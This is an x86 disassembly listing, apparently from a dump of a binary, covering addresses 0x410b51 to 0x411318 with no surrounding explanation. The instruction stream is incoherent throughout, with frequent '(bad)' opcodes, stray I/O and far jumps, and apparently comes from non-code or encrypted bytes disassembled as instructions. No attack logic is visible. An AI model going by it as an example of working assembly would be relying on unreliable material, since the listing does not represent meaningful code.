  410b51:	ficomp WORD PTR [ebp+0x48]
  410b54:	cmp    eax,0x8f29a22e
  410b59:	fsubr  DWORD PTR [ecx+edx*2]
  410b5c:	psrlq  mm4,mm2
  410b5f:	fwait
  410b60:	call   0x601218e
  410b65:	push   es
  410b66:	xor    BYTE PTR [edi+esi*8],dh
  410b69:	adc    bl,bl
  410b6b:	xchg   ecx,eax
  410b6c:	mov    ds:0xbc5d1b93,eax
  410b71:	xlat   BYTE PTR ds:[ebx]
  410b72:	aam    0xd6
  410b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b75:	add    eax,0x75cd1366
  410b7a:	fstp   QWORD PTR [ebx]
  410b7c:	inc    esi
  410b7d:	adc    BYTE PTR [edx],dh
  410b7f:	and    al,0xb7
  410b81:	pop    edi
  410b82:	sbb    al,0x87
  410b85:	push   esp
  410b86:	imul   esp,DWORD PTR [eax+0x61d3b68d],0xb827fcf9
  410b90:	inc    edi
  410b91:	adc    al,0x3
  410b93:	xor    ecx,DWORD PTR ds:[esp+edi*1-0x61]
  410b98:	jmp    0x1dc608db
  410b9d:	mov    edx,0x7f363875
  410ba2:	les    esp,FWORD PTR ds:0xbd56dd82
  410ba8:	jmp    0x32ff:0x32a54c5
  410baf:	hlt    
  410bb0:	imul   ebx,DWORD PTR [ebp-0x6d],0x5a2a01af
  410bb7:	out    dx,al
  410bb8:	mov    eax,ds:0x9454e257
  410bbd:	sbb    al,0x2e
  410bbf:	mov    es,WORD PTR [ebx]
  410bc1:	push   0xffffffe2
  410bc3:	push   ebx
  410bc4:	(bad)  
  410bc5:	adc    al,0x1c
  410bc7:	retf   0x9fa2
  410bca:	je     0x410c28
  410bcc:	adc    ebx,DWORD PTR [ebx]
  410bce:	xor    eax,0x806e8161
  410bd3:	cmp    cl,BYTE PTR [ecx-0x15]
  410bd6:	pop    ecx
  410bd7:	ret    
  410bd8:	sub    DWORD PTR [ecx],esp
  410bda:	xchg   DWORD PTR [eax+0x286914bc],ecx
  410be0:	sbb    bl,BYTE PTR [edx]
  410be2:	fistp  QWORD PTR [esi]
  410be4:	out    0x9,eax
  410be6:	repnz leave 
  410be8:	sub    dl,bh
  410bea:	push   ebx
  410beb:	cmp    BYTE PTR [ecx+ebp*1],cl
  410bee:	mov    bl,BYTE PTR [ebx]
  410bf0:	dec    ecx
  410bf1:	arpl   sp,dx
  410bf3:	cmp    BYTE PTR [edx],bl
  410bf5:	fadd   QWORD PTR [edi+0x2537db84]
  410bfb:	ss inc ebp
  410bfd:	(bad)  
  410bfe:	and    ebp,esp
  410c00:	push   ss
  410c01:	xchg   edi,eax
  410c02:	jne    0x410bce
  410c04:	repz in al,dx
  410c06:	lea    esi,[edx-0x3e3bc210]
  410c0c:	pop    ebx
  410c0d:	jns    0x410bea
  410c0f:	cmp    al,0x7f
  410c11:	xor    ch,BYTE PTR [esi]
  410c13:	pop    esi
  410c14:	jle    0x410c12
  410c16:	stos   DWORD PTR es:[edi],eax
  410c17:	(bad)
  410c1a:	sahf   
  410c1b:	dec    eax
  410c1c:	cmp    cl,BYTE PTR [esi]
  410c1e:	mov    dl,dh
  410c20:	inc    edi
  410c21:	cwde   
  410c22:	add    DWORD PTR [edx-0x55],0xab10f1b
  410c29:	mov    ebx,0x5742944a
  410c2e:	mov    al,0xfe
  410c30:	div    dl
  410c32:	or     esi,DWORD PTR [ecx-0x4cce3c8]
  410c38:	jb     0x410c0f
  410c3a:	mov    edi,ebp
  410c3c:	dec    ebx
  410c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c3e:	push   ebx
  410c3f:	into   
  410c40:	inc    edx
  410c41:	jecxz  0x410c10
  410c43:	enter  0x7efa,0xb8
  410c47:	mov    al,0x4d
  410c49:	xlat   BYTE PTR ds:[ebx]
  410c4a:	lds    ebp,FWORD PTR [ebx]
  410c4c:	dec    edx
  410c4d:	out    0x1d,eax
  410c4f:	in     al,0xaa
  410c51:	dec    edi
  410c52:	call   0x609f:0x3d21d4d9
  410c59:	stos   DWORD PTR es:[edi],eax
  410c5a:	mov    ch,0xfd
  410c5c:	shl    BYTE PTR [esi+eax*4],0xd1
  410c60:	(bad)  
  410c61:	int3   
  410c62:	enter  0x94e2,0x18
  410c66:	add    ch,BYTE PTR [edi]
  410c68:	pushf  
  410c69:	mov    esi,ebx
  410c6b:	push   edi
  410c6c:	xchg   esi,eax
  410c6d:	and    DWORD PTR [ebx+0x21],ebp
  410c70:	es jg  0x410c87
  410c73:	stos   BYTE PTR es:[edi],al
  410c74:	pop    es
  410c75:	imul   BYTE PTR [ebp+0x2eade386]
  410c7b:	jae    0x410cbe
  410c7d:	jae    0x410c45
  410c7f:	pop    ds
  410c80:	xchg   BYTE PTR [edi+0xf39f57e],ah
  410c86:	cwde   
  410c87:	bnd jg 0x410c2d
  410c8a:	sub    al,0x77
  410c8c:	pop    ds
  410c8d:	je     0x410c52
  410c8f:	data16 loope 0x410cc2
  410c92:	jae    0x410c4c
  410c94:	adc    BYTE PTR [ebx+ebx*4],cl
  410c97:	in     al,dx
  410c98:	jbe    0x410c2e
  410c9a:	into   
  410c9b:	dec    edx
  410c9c:	icebp  
  410c9d:	ins    BYTE PTR es:[edi],dx
  410c9e:	outs   dx,BYTE PTR ds:[esi]
  410ca0:	scas   eax,DWORD PTR es:[edi]
  410ca1:	test   DWORD PTR [edx],edx
  410ca3:	and    dl,BYTE PTR [eax-0x77fb4144]
  410ca9:	xor    bh,BYTE PTR [esi-0x36f51d84]
  410caf:	xor    al,0xc3
  410cb1:	adc    al,0x23
  410cb3:	push   esi
  410cb4:	ins    BYTE PTR es:[edi],dx
  410cb5:	xchg   edx,eax
  410cb6:	mov    WORD PTR [ebx],ss
  410cb8:	daa    
  410cb9:	jb     0x410cdb
  410cbb:	lods   eax,DWORD PTR ds:[esi]
  410cbc:	xor    al,0x12
  410cbe:	jmp    0x84bb86c3
  410cc3:	std    
  410cc4:	leave  
  410cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cc6:	push   0x8e74dab2
  410ccb:	call   0x7177:0x1d22d55f
  410cd2:	ins    BYTE PTR es:[edi],dx
  410cd3:	xchg   edi,eax
  410cd4:	adc    DWORD PTR [eax+eiz*8],0x59
  410cd8:	cs xchg ebp,eax
  410cda:	xchg   bh,cl
  410cdc:	das    
  410cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cde:	cmp    ch,bl
  410ce0:	mov    ds,WORD PTR [edi]
  410ce2:	and    ah,BYTE PTR [ebx-0x190596d9]
  410ce8:	jl     0x410d49
  410cea:	dec    ecx
  410ceb:	push   ebp
  410cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ced:	iret   
  410cee:	in     al,0xe9
  410cf0:	jbe    0x410d23
  410cf2:	retf   
  410cf3:	pop    ds
  410cf4:	inc    edi
  410cf5:	(bad)  
  410cf6:	out    dx,al
  410cf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cf8:	scas   eax,DWORD PTR es:[edi]
  410cf9:	pop    es
  410cfa:	adc    eax,0x55643171
  410cff:	xor    ebp,ebx
  410d01:	cmp    cl,BYTE PTR [esi+0x51]
  410d04:	sahf   
  410d05:	lds    esi,FWORD PTR [ebp+0x5a]
  410d08:	adc    BYTE PTR [edx+ecx*2],0x9
  410d0c:	in     eax,0xb
  410d0e:	xchg   edx,eax
  410d0f:	in     al,dx
  410d10:	call   0xaf1bac3a
  410d15:	cmp    bl,BYTE PTR [ebx-0x23e33147]
  410d1b:	cs cmc 
  410d1d:	push   edi
  410d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d1f:	adc    ebx,DWORD PTR [edx+0xb]
  410d22:	not    al
  410d24:	(bad)  
  410d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d26:	xchg   BYTE PTR [edi+0x4cb878e7],dl
  410d2c:	push   cs
  410d2d:	xor    eax,0x38733885
  410d32:	icebp  
  410d33:	arpl   WORD PTR [edx-0x1efe2396],si
  410d39:	adc    BYTE PTR [edx+edx*4+0x74],bh
  410d3d:	shl    DWORD PTR [esi+0x75146675],0xe3
  410d44:	sar    DWORD PTR [edx-0x71],0x8a
  410d48:	aam    0x7f
  410d4a:	ficomp WORD PTR [edx-0x4256731f]
  410d50:	adc    ebx,DWORD PTR [edx-0x50]
  410d53:	out    dx,al
  410d54:	fs cmp al,0x9e
  410d57:	mov    edi,ecx
  410d59:	xchg   edx,eax
  410d5a:	loop   0x410da4
  410d5c:	cli    
  410d5d:	es retf 0x7cf9
  410d61:	in     eax,0xad
  410d63:	push   ebp
  410d64:	mov    bl,0xc5
  410d66:	xchg   edx,eax
  410d67:	mov    BYTE PTR [eax-0x42],cl
  410d6a:	mov    ebp,0x93f6f347
  410d6f:	rcl    BYTE PTR [ebx+ecx*4-0x46],cl
  410d73:	jmp    0x4a974990
  410d78:	mov    ecx,0xfd382b8
  410d7d:	daa    
  410d7e:	jg     0x410d33
  410d80:	and    DWORD PTR [ecx-0x10],ebx
  410d83:	call   0xfd9fe66f
  410d88:	adc    BYTE PTR [ecx-0x37],al
  410d8b:	cmp    al,0x42
  410d8d:	jns    0x410dec
  410d8f:	retf   
  410d90:	mov    al,ds:0xc414d6b5
  410d95:	imul   ebp,DWORD PTR [esi+0x4ddda47b],0x70
  410d9c:	inc    ebx
  410d9d:	inc    ecx
  410d9e:	retf   
  410d9f:	mov    edi,0x9493b649
  410da4:	and    esp,DWORD PTR [edx-0x6afb8bce]
  410daa:	mov    ecx,0xc0f77a60
  410daf:	arpl   WORD PTR [ebp-0x75],di
  410db2:	inc    edx
  410db3:	fmul   QWORD PTR [ebx-0xd0aa927]
  410db9:	pop    ecx
  410dba:	(bad)  
  410dbb:	ins    DWORD PTR es:[edi],dx
  410dbc:	in     al,0x58
  410dbe:	jg     0x410de5
  410dc0:	xor    ah,BYTE PTR [edi+0x78]
  410dc3:	mov    ds:0x728797bc,eax
  410dc8:	jbe    0x410da9
  410dca:	loop   0x410dd9
  410dcc:	and    cl,BYTE PTR ds:[edi+0x39]
  410dd0:	out    dx,eax
  410dd1:	aam    0x2c
  410dd3:	push   edx
  410dd4:	test   ebp,edi
  410dd6:	and    DWORD PTR [ebp+0x7485983d],edi
  410ddc:	mov    ebp,edi
  410dde:	aaa    
  410ddf:	jmp    0x410db2
  410de1:	push   ecx
  410de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410de3:	call   0x855:0x8bdea0cb
  410dea:	jmp    0x4111de
  410def:	inc    edi
  410df0:	cli    
  410df1:	fisttp DWORD PTR [edx+0x517569e1]
  410df7:	jp     0x410dcf
  410df9:	xchg   ecx,eax
  410dfa:	mov    edx,0x3738df83
  410dff:	mov    esp,0x497070b8
  410e04:	jge    0x410e76
  410e06:	jo     0x410da4
  410e08:	lock xor al,0xdb
  410e0b:	jl     0x410e29
  410e0d:	int3   
  410e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e0f:	jne    0x410db7
  410e11:	imul   bl
  410e13:	nop
  410e14:	pop    edx
  410e15:	outs   dx,DWORD PTR ds:[esi]
  410e16:	xor    al,0x9b
  410e18:	sbb    bh,BYTE PTR [eax-0x28a2928]
  410e1e:	pusha  
  410e1f:	and    BYTE PTR [esi],0xbc
  410e22:	call   0x6ee6:0x622dd8a8
  410e29:	inc    ebx
  410e2a:	aaa    
  410e2b:	int3   
  410e2c:	xor    ebx,esi
  410e2e:	or     al,0xa4
  410e30:	fdivr  DWORD PTR [edi]
  410e32:	mov    dh,0x96
  410e34:	dec    ebx
  410e36:	mov    esi,0xd5f5f9cf
  410e3b:	int3   
  410e3c:	cmp    ch,BYTE PTR [ecx+0x1b]
  410e3f:	jnp    0x410e52
  410e41:	(bad)  
  410e42:	cld    
  410e43:	add    eax,0xea5c4a9a
  410e48:	cwde   
  410e49:	in     eax,0x7
  410e4b:	and    al,bh
  410e4d:	push   esi
  410e4e:	call   0x6003:0x324df455
  410e55:	add    BYTE PTR [eax+edi*4],0xe6
  410e59:	mov    bl,0x40
  410e5b:	idiv   BYTE PTR [eax-0x535741b1]
  410e61:	mov    ebx,0xf8b304d5
  410e66:	cmp    esp,DWORD PTR [eax+ebx*8]
  410e69:	sbb    BYTE PTR es:[ecx*2-0xbebfb2e],0x53
  410e72:	mov    ?,WORD PTR [edi+edx*1-0x59]
  410e76:	cmp    dl,BYTE PTR cs:[eax+0x3278322c]
  410e7d:	xor    BYTE PTR [ebx*2+0x3cc516a8],cl
  410e84:	push   cs
  410e85:	out    0x24,al
  410e87:	add    al,0x32
  410e89:	stc    
  410e8a:	hlt    
  410e8b:	cmp    edi,ebx
  410e8d:	cmp    eax,0x601ec762
  410e92:	je     0x410e67
  410e94:	and    BYTE PTR [ebx+0x40],ah
  410e97:	popf   
  410e98:	pop    es
  410e99:	jge    0x410e5b
  410e9b:	push   esi
  410e9c:	cwde   
  410e9d:	xor    eax,ecx
  410e9f:	jo     0x410e60
  410ea1:	std    
  410ea2:	shl    DWORD PTR [edx-0x376a519d],cl
  410ea8:	xchg   ebx,eax
  410ea9:	or     eax,0x6045df1d
  410eae:	and    ecx,DWORD PTR [edi-0x63]
  410eb1:	xor    ecx,DWORD PTR [esi+0x55]
  410eb4:	or     BYTE PTR ds:0x8d024d06,0xa6
  410ebb:	jecxz  0x410f1a
  410ebd:	fcom   DWORD PTR [ecx+eiz*1-0x7f]
  410ec1:	pop    esi
  410ec2:	int3   
  410ec3:	push   ds
  410ec4:	mov    edx,0x56be068
  410ec9:	sub    eax,0xa36d6559
  410ece:	hlt    
  410ecf:	xchg   esp,ecx
  410ed1:	cmp    eax,0x335bf72d
  410ed6:	xchg   esp,eax
  410ed7:	(bad)  
  410ed9:	jmp    0xc060:0x43454de6
  410ee0:	inc    ebx
  410ee1:	jmp    0x2ea4:0xed2b0ffe
  410ee8:	cdq    
  410ee9:	xchg   esi,eax
  410eea:	mov    eax,DWORD PTR [ecx-0x53]
  410eed:	mov    bl,0xa0
  410eef:	inc    ebx
  410ef0:	(bad)  [edi+0x73097f6d]
  410ef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ef7:	cwde   
  410ef8:	ret    
  410ef9:	hlt    
  410efa:	fcomi  st,st(2)
  410efc:	xor    ebx,esi
  410efe:	lock loop 0x410f64
  410f01:	cli    
  410f02:	icebp  
  410f03:	jle    0x410ec5
  410f05:	es retf 0x79ca
  410f09:	xlat   BYTE PTR es:[ebx]
  410f0b:	jae    0x410f1c
  410f0d:	mov    eax,ds:0x65e4eeda
  410f12:	sbb    al,0x41
  410f14:	add    DWORD PTR [ecx+0x741c7881],ecx
  410f1a:	dec    esi
  410f1b:	jns    0x410f2e
  410f1d:	mov    dh,0x7a
  410f1f:	and    DWORD PTR [ebx+0x6e],edi
  410f22:	(bad)  
  410f23:	in     eax,0x35
  410f25:	adc    dh,BYTE PTR [edx]
  410f27:	xor    DWORD PTR [ebp+ecx*8+0x20],esp
  410f2b:	mul    cl
  410f2d:	fistp  DWORD PTR [ecx+0x1f]
  410f30:	in     eax,0xb2
  410f32:	xor    ebx,DWORD PTR [esi]
  410f34:	bnd jle 0x410f19
  410f37:	dec    esp
  410f38:	cmp    al,BYTE PTR [eax-0x17946922]
  410f3e:	push   ebp
  410f3f:	in     al,0x89
  410f41:	dec    esp
  410f42:	push   esi
  410f43:	out    dx,eax
  410f44:	sub    BYTE PTR [edi+edx*8-0x3cf71ab1],0x51
  410f4c:	add    BYTE PTR [ebp-0x19f5da04],0x19
  410f53:	push   ebp
  410f54:	in     al,dx
  410f55:	pop    edi
  410f56:	(bad)  
  410f57:	pusha  
  410f58:	adc    DWORD PTR [ebx],esi
  410f5a:	or     al,dh
  410f5c:	lods   al,BYTE PTR ds:[esi]
  410f5d:	outs   dx,BYTE PTR ds:[esi]
  410f5e:	out    0xc0,eax
  410f60:	pop    ds
  410f61:	loop   0x410fd0
  410f63:	xchg   ecx,eax
  410f64:	aad    0xfb
  410f66:	jge    0x410f6c
  410f68:	push   ebp
  410f69:	in     eax,0x5
  410f6b:	jns    0x410f01
  410f6d:	cld    
  410f6e:	sbb    eax,DWORD PTR [esi+edi*1]
  410f71:	test   BYTE PTR [ebp-0x54],ch
  410f74:	jp     0x410f2d
  410f76:	(bad)  
  410f77:	aad    0x2
  410f79:	xchg   edx,eax
  410f7a:	inc    esi
  410f7b:	dec    ebx
  410f7c:	mov    dl,0x1d
  410f7e:	inc    esp
  410f7f:	cmp    ch,BYTE PTR [eax+esi*1+0x74d1d0b3]
  410f86:	loope  0x410ff8
  410f88:	ds dec eax
  410f8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f8b:	dec    eax
  410f8c:	dec    ebx
  410f8d:	xor    al,0x2d
  410f8f:	in     eax,dx
  410f90:	das    
  410f91:	xchg   ebp,eax
  410f92:	aam    0xb4
  410f94:	call   0xd3eeacaf
  410f99:	dec    edi
  410f9a:	dec    esp
  410f9b:	and    eax,0xbc3f6d2c
  410fa0:	add    dh,BYTE PTR [esi-0x76c72884]
  410fa6:	retf   
  410fa7:	add    DWORD PTR [edi],ecx
  410fa9:	imul   ebx,ebp,0x30c0872
  410faf:	fs scas al,BYTE PTR es:[edi]
  410fb1:	mov    bh,BYTE PTR [eax]
  410fb3:	mov    al,BYTE PTR [ebx+0x46]
  410fb6:	jecxz  0x410fc5
  410fb8:	and    ebx,DWORD PTR [ebx+ebp*4+0x1885fe67]
  410fbf:	je     0x411001
  410fc1:	jmp    0xd8ea:0x10393837
  410fc8:	lods   eax,DWORD PTR ds:[esi]
  410fc9:	mov    dh,0xde
  410fcb:	mov    ah,0x80
  410fcd:	and    al,0x15
  410fcf:	add    esp,edi
  410fd1:	mov    ds:0x3926112b,eax
  410fd6:	adc    BYTE PTR [eax+0x4a],ch
  410fd9:	(bad)  
  410fdb:	enter  0x85cd,0x1c
  410fdf:	int3   
  410fe0:	(bad)  
  410fe1:	ins    DWORD PTR es:[edi],dx
  410fe2:	dec    ecx
  410fe3:	retf   
  410fe4:	xor    bl,BYTE PTR [edi]
  410fe6:	dec    esp
  410fe7:	xor    BYTE PTR [ecx+0xa276f02],cl
  410fed:	cmp    dl,ah
  410fef:	adc    DWORD PTR [edx-0x684b4ca],ecx
  410ff5:	adc    DWORD PTR [edi],0xd7ca24f4
  410ffb:	jmp    0xe85d5e84
  411000:	out    dx,al
  411001:	pop    ebx
  411002:	xor    eax,0x62a6d14a
  411007:	mov    eax,0xfbd01348
  41100c:	push   edi
  41100d:	mov    edi,0x86fa79b
  411012:	pop    ss
  411013:	dec    edi
  411014:	mov    esi,0xfc736d05
  411019:	es int3 
  41101b:	pop    esp
  41101c:	push   esi
  41101d:	in     al,dx
  41101e:	setl   BYTE PTR [eax+0x150a2ef8]
  411025:	push   edi
  411026:	adc    DWORD PTR [ecx],esi
  411028:	cli    
  411029:	fdivr  QWORD PTR [ebx-0x66]
  41102c:	dec    ecx
  41102d:	cmp    ebx,ecx
  41102f:	adc    BYTE PTR [ebx-0x1a],ch
  411032:	jne    0x411024
  411034:	leave  
  411035:	sub    esp,esp
  411037:	sub    eax,0x96adc240
  41103c:	bound  edx,QWORD PTR [esp+eax*8+0x2fc66e7f]
  411043:	cwde   
  411044:	ds aam 0xfc
  411047:	mov    dl,0x81
  411049:	push   cs
  41104a:	cmp    al,0x6e
  41104c:	shr    DWORD PTR [esi],1
  41104e:	(bad)  
  41104f:	out    dx,al
  411050:	mov    eax,ss
  411052:	je     0x4110c2
  411054:	popa   
  411055:	sbb    bl,BYTE PTR [esi-0x17]
  411058:	push   eax
  411059:	fimul  DWORD PTR ss:[ecx+0x1b621d4e]
  411060:	aad    0xf4
  411062:	loop   0x4110a2
  411064:	push   ds
  411065:	mov    esi,0x356755ec
  41106a:	add    BYTE PTR [esi+0xdeac0c6],0x14
  411071:	xchg   ecx,eax
  411072:	mov    ss,eax
  411074:	aad    0x35
  411076:	adc    eax,0xab5420e6
  41107b:	jno    0x4110db
  41107d:	int3   
  41107e:	ins    DWORD PTR es:[edi],dx
  41107f:	not    DWORD PTR [ecx-0x6]
  411082:	sbb    BYTE PTR [ecx],dh
  411084:	sbb    DWORD PTR [ecx+eax*1],ecx
  411087:	cmp    eax,0x45694867
  41108c:	xor    edi,eax
  41108e:	and    eax,DWORD PTR [edi-0x6af9391a]
  411094:	mov    bl,0x26
  411096:	sub    al,0x99
  411098:	inc    edx
  411099:	add    BYTE PTR [eax+0x30],cl
  41109c:	fs sbb dl,bl
  41109f:	cmp    al,0xb2
  4110a1:	mov    edx,0xd551bccd
  4110a6:	adc    BYTE PTR [ebx+0x50],ch
  4110a9:	mov    esi,0x80884a99
  4110ae:	shr    ah,0xef
  4110b1:	arpl   WORD PTR [esi-0x69216771],ax
  4110b7:	ins    DWORD PTR es:[edi],dx
  4110b8:	mov    dl,0x6
  4110ba:	ins    BYTE PTR es:[edi],dx
  4110bb:	push   esp
  4110bc:	in     eax,dx
  4110bd:	cwde   
  4110be:	popa   
  4110bf:	xchg   ecx,eax
  4110c0:	scas   al,BYTE PTR es:[edi]
  4110c1:	retf   0x23d
  4110c4:	clc    
  4110c5:	js     0x4110a3
  4110c7:	mov    ds:0x97f666ec,al
  4110cc:	xchg   esp,eax
  4110cd:	fsub   st(5),st
  4110cf:	mov    dl,0xc8
  4110d1:	cmp    bl,BYTE PTR [ebp+0x1a]
  4110d4:	into   
  4110d5:	and    ch,0x49
  4110d8:	fwait
  4110d9:	shl    BYTE PTR [edx+edx*2+0x3d98fa91],0x2f
  4110e1:	int3   
  4110e2:	inc    ebx
  4110e3:	mov    ecx,0x1a0db58c
  4110e8:	dec    ecx
  4110e9:	shl    ah,cl
  4110eb:	sti    
  4110ec:	pop    ss
  4110ed:	mul    DWORD PTR [ecx]
  4110ef:	rcr    DWORD PTR [ecx+0x1a482293],0x6c
  4110f6:	xchg   edx,eax
  4110f7:	push   ecx
  4110f8:	mov    ch,0x8e
  4110fa:	mov    eax,ds:0x1288f24f
  4110ff:	mov    BYTE PTR [ebp-0x3980755a],bl
  411105:	and    eax,0xbad69bfd
  41110a:	cmp    al,ah
  41110c:	bound  ebp,QWORD PTR [esi-0xe919ed2]
  411112:	lock mov eax,eax
  411115:	nop
  411116:	ror    dh,1
  411118:	lods   eax,DWORD PTR ds:[esi]
  411119:	jbe    0x411164
  41111b:	mov    ds:0xad26cf3f,eax
  411120:	cmp    DWORD PTR [esi+0x354536fa],0x7c2c7750
  41112a:	or     al,ah
  41112c:	inc    ebp
  41112d:	popa   
  41112e:	jmp    DWORD PTR [bp+si+0x72]
  411132:	ret    
  411133:	and    BYTE PTR [ebp+esi*1-0x11],bh
  411137:	or     eax,0x1f85da01
  41113c:	std    
  41113d:	xchg   DWORD PTR [eax-0x1bc0432],edi
  411143:	lea    ebx,[edi]
  411145:	sahf   
  411146:	ss hlt 
  411148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411149:	sbb    al,0x76
  41114b:	lock fs jecxz 0x4111b8
  41114f:	sub    BYTE PTR [ecx+0x3b],0x94
  411153:	mov    ebp,0xaccfa46b
  411158:	out    dx,eax
  411159:	pushf  
  41115a:	loopne 0x4110e8
  41115c:	pop    ecx
  41115d:	scas   eax,DWORD PTR es:[edi]
  41115e:	or     al,0xb
  411160:	xor    DWORD PTR [edx-0x76e0420f],eax
  411166:	loopne 0x41117b
  411168:	cmc    
  411169:	adc    ah,dh
  41116b:	inc    ebx
  41116c:	adc    eax,DWORD PTR [edx+0x2]
  41116f:	jle    0x411186
  411171:	sbb    dl,BYTE PTR [esp+ebp*1-0x453c08f5]
  411178:	daa    
  411179:	inc    eax
  41117a:	pop    esp
  41117b:	jbe    0x41112d
  41117d:	add    eax,0x2a3d5fd7
  411182:	and    ch,BYTE PTR ds:[eax-0x1a]
  411186:	push   0xffffffb2
  411188:	adc    al,BYTE PTR [edx-0x15c84767]
  41118e:	jo     0x411194
  411190:	fwait
  411191:	xchg   esi,eax
  411192:	mov    bl,0x39
  411194:	fs jp  0x411179
  411197:	add    BYTE PTR [eax+0x3d],0xca
  41119b:	push   0x8ad5a99c
  4111a0:	test   al,0xfb
  4111a2:	sub    DWORD PTR [eiz*8-0x12d74a2],esp
  4111a9:	int3   
  4111aa:	popa   
  4111ab:	retf   
  4111ac:	cmp    DWORD PTR [edx+0x6],eax
  4111af:	push   ecx
  4111b0:	xor    DWORD PTR [ecx+0x5958ff12],ebx
  4111b6:	ss in  al,dx
  4111b8:	add    ebp,eax
  4111ba:	lods   eax,DWORD PTR ds:[esi]
  4111bb:	or     BYTE PTR [esi+eax*4],cl
  4111be:	adc    edi,ebx
  4111c0:	leave  
  4111c1:	sub    DWORD PTR [esi],edi
  4111c3:	push   0xaea36e9a
  4111c8:	pushf  
  4111c9:	and    al,0x82
  4111cb:	sahf   
  4111cc:	or     eax,0x6f7aef95
  4111d1:	push   ecx
  4111d2:	out    0xd6,al
  4111d4:	push   ecx
  4111d5:	(bad)  
  4111d6:	jae    0x41123b
  4111d8:	sub    BYTE PTR [esi-0x77],bl
  4111db:	cmp    eax,0xc133b0d1
  4111e0:	lea    eax,[eax+edx*1+0x32729c]
  4111e7:	mov    DWORD PTR [ebp+0x8],eax
  4111ea:	mov    eax,DWORD PTR [ebp-0x18]
  4111ed:	jmp    0x4115e1
  4111f2:	mov    al,0x3c
  4111f4:	fwait
  4111f5:	xchg   ebx,eax
  4111f6:	fwait
  4111f7:	jae    0x411261
  4111f9:	rol    DWORD PTR [ebp-0x19bca301],cl
  4111ff:	(bad)  
  411200:	mov    ecx,edx
  411202:	xchg   ebp,eax
  411203:	inc    esp
  411204:	jo     0x411276
  411206:	dec    ecx
  411207:	jge    0x411279
  411209:	jo     0x4111cc
  41120b:	fadd   DWORD PTR [edx-0x7f]
  41120e:	jns    0x4111a4
  411210:	mov    eax,0xb9c9c7ec
  411215:	and    al,0xfb
  411217:	(bad)  
  411218:	push   edx
  411219:	(bad)  
  41121b:	sub    al,0xd0
  41121d:	shr    ebp,1
  41121f:	jl     0x411246
  411221:	push   ss
  411222:	sbb    esi,DWORD PTR [eax-0x2e493f3c]
  411228:	mov    ch,0x92
  41122a:	add    BYTE PTR [ecx-0x69],dl
  41122d:	inc    edx
  41122e:	adc    DWORD PTR cs:[eax-0x62],0xffffffdb
  411233:	fmul   DWORD PTR [ecx-0x38]
  411236:	mov    dl,0xd6
  411238:	fisubr DWORD PTR [ebp-0x23]
  41123b:	aam    0xa1
  41123d:	add    al,0x11
  41123f:	retf   0xeefa
  411242:	iret   
  411243:	add    al,0x96
  411245:	mov    ebx,0xa11f603c
  41124a:	daa    
  41124b:	adc    ebp,DWORD PTR [edi]
  41124d:	jg     0x4111de
  41124f:	mov    BYTE PTR [eax+0x78],dl
  411252:	cmp    edi,edx
  411254:	xor    eax,0x60164c8f
  411259:	or     eax,0xae726c14
  41125e:	xchg   edi,eax
  41125f:	sbb    eax,0xd3efdc51
  411264:	out    dx,eax
  411265:	call   0xe3d0cbfa
  41126a:	mov    cl,0x25
  41126c:	sub    al,0xbc
  41126e:	arpl   sp,si
  411270:	nop
  411271:	mov    BYTE PTR [edx],ch
  411273:	push   ecx
  411274:	ins    DWORD PTR es:[edi],dx
  411275:	out    0x3c,al
  411277:	inc    esi
  411278:	jno    0x411237
  41127a:	gs enter 0xfe10,0xe
  41127f:	pop    esp
  411280:	pusha  
  411281:	adc    dl,BYTE PTR [edi]
  411283:	int    0xd6
  411285:	aas    
  411286:	jmp    0x62:0x429eb6e5
  41128d:	(bad)  
  41128e:	jl     0x411227
  411290:	cmp    esp,DWORD PTR [edx]
  411292:	ror    BYTE PTR [ecx],cl
  411294:	fiadd  WORD PTR ds:0x7dd011f7
  41129a:	rcl    edi,0x22
  41129d:	pop    edi
  41129e:	retf   0x18db
  4112a1:	leave  
  4112a2:	adc    bl,BYTE PTR [edx]
  4112a4:	mov    dl,0xeb
  4112a6:	adc    BYTE PTR [ebx+0x6],0x26
  4112aa:	xor    BYTE PTR [edi-0x1b1a183d],dl
  4112b0:	mov    dl,0xa9
  4112b2:	xchg   esp,eax
  4112b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112b4:	ins    BYTE PTR es:[edi],dx
  4112b5:	fs out dx,al
  4112b7:	add    eax,0xd948b0a5
  4112bc:	pop    ds
  4112bd:	data16 mov ah,0x6a
  4112c0:	sub    DWORD PTR [ebx-0x31],0x2e38ba78
  4112c7:	inc    edi
  4112c8:	std    
  4112c9:	neg    BYTE PTR [esi+0x1d71c989]
  4112cf:	leave  
  4112d0:	dec    ecx
  4112d1:	cli    
  4112d2:	pop    ss
  4112d3:	fisubr WORD PTR [ecx+0x79f437f2]
  4112d9:	inc    eax
  4112da:	mov    ds:0x73524d51,eax
  4112df:	int3   
  4112e0:	call   0xcfd3e389
  4112e5:	fsubrp st(7),st
  4112e7:	pop    ebp
  4112e8:	push   esi
  4112e9:	fstp   TBYTE PTR [eax-0x3]
  4112ec:	mov    esp,0x237306ef
  4112f1:	rcl    BYTE PTR [ecx-0x7c637355],0x8d
  4112f8:	shr    DWORD PTR [esi+esi*2],0x2b
  4112fc:	xor    eax,0x26dcaccc
  411301:	push   ebp
  411302:	aas    
  411303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411304:	out    0xb7,eax
  411306:	xlat   BYTE PTR ds:[ebx]
  411307:	lahf   
  411308:	ret    
  411309:	ret    0x25a5
  41130c:	or     bl,BYTE PTR [edi]
  41130e:	fcomp  QWORD PTR ss:[ebp+0x6f5cfa38]
  411315:	in     eax,dx
  411316:	inc    eax
  411317:	aaa    
  411318:	dec    edx
